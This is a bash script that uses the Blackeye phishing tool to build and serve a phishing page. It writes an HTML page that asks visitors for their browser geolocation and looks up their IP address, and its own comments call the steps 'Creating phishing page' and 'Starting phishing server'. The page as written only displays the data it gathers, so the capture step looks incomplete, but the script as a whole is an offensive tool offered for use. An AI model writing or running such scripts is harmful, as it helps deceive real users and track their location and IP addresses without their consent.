#!/bin/bash

# Blackeye configuration
BLACK_EYE_DIR="/path/to/blackeye"
TEMPLATE="custom"

# Create a phishing page
echo "Creating phishing page..."
cd $BLACK_EYE_DIR
bash blackeye.sh -t $TEMPLATE -p 8080

# Integrate your HTML code
echo "Integrating HTML code..."
cd $BLACK_EYE_DIR/sites/$TEMPLATE
echo "<!DOCTYPE html>
<html lang='en'>
<head>
  <meta charset='UTF-8'>
  <meta name='viewport' content='width=device-width, initial-scale=1.0'>
  <title>Geolocation Example</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    #location {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
    }
  </style>
</head>
<body>
  <div id='location'>Fetching location...</div>

  <script>
    // Function to display location or IP address
    function displayLocation(lat, lng, ipAddress) {
      document.getElementById('location').innerHTML = 
        `Latitude: ${lat}, Longitude: ${lng}, IP Address: ${ipAddress}`;
    }

    // Function to handle permission denial
    function handlePermissionDenied(ipAddress) {
      document.getElementById('location').innerHTML = 
        `Location access denied. IP Address: ${ipAddress}`;
    }

    // Check if geolocation is supported by the browser
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lng = position.coords.longitude;

          // Get the user's IP address
          fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
              const ipAddress = data.ip;
              displayLocation(lat, lng, ipAddress);
            });
        },
        (error) => {
          if (error.code === error.PERMISSION_DENIED) {
            fetch('https://api.ipify.org?format=json')
              .then(response => response.json())
              .then(data => {
                const ipAddress = data.ip;
                handlePermissionDenied(ipAddress);
              });
          } else {
            console.error('Error getting user location:', error);
          }
        }
      );
    } else {
      document.getElementById('location').innerHTML = 'Geolocation is not supported by this browser.';
    }
  </script>
</body>
</html>" > index.html

# Start the phishing server
echo "Starting phishing server..."
bash blackeye.sh -s